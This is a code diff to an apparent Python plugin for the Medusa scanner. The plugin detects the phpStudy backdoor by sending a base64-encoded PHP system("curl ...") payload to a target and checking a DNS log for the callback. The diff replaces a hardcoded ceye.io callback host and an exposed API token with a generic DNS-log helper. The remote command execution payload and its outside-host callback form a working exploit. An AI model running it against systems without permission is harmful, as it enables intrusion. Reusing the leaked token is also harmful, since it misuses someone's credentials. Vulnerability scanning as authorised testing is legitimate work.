@@ -1,7 +1,6 @@
 import urllib.parse
 import requests
 import base64
-import random
 import time
 import ClassCongregation
 class VulnerabilityInfo(object):
@@ -36,9 +35,8 @@ def medusa(Url,RandomAgent,UnixTimestamp):
         port = 80
     else:
         port = port
-
-    Random = str(random.randint(666, 666666))
-    commandS = ('''system("curl http://{}_phpStudy_backdoor_{}.7ktb2x.ceye.io");''').format(url, Random)
+    DL=ClassCongregation.Dnslog()
+    commandS = ('''system("curl http://{}");''').format(DL.dns_host())
     cmd = base64.b64encode(commandS.encode('utf-8'))
     try:
         payload_url = scheme+"://"+url+ ':' + str(port)+payload
@@ -54,17 +52,11 @@ def medusa(Url,RandomAgent,UnixTimestamp):
         }
         s = requests.session()
         resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
-        time.sleep(5)
-        ceyeurl = 'http://api.ceye.io/v1/records?token=f84734983a259c598a1edeb772981d14&type=dns&filter='
-        try:
-            ceye_content = requests.get(ceyeurl, timeout=5).content
-            if "{}_phpStudy_backdoor_{}".format(url, Random) in ceye_content:
-                Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader\r\n{}".format(url, payload_url,headers)
-                _t = VulnerabilityInfo(Medusa)
-                ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
-                ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
-        except:
-            _ = VulnerabilityInfo('').info.get('algroup')
-            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
-    except Exception as e:
-        pass
+        if DL.result():
+            Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader:{}\r\nDNSLOG内容:{}\r\n".format(url, payload_url,headers,DL.dns_host())
+            _t = VulnerabilityInfo(Medusa)
+            ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
+            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
+    except:
+        _ = VulnerabilityInfo('').info.get('algroup')
+        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
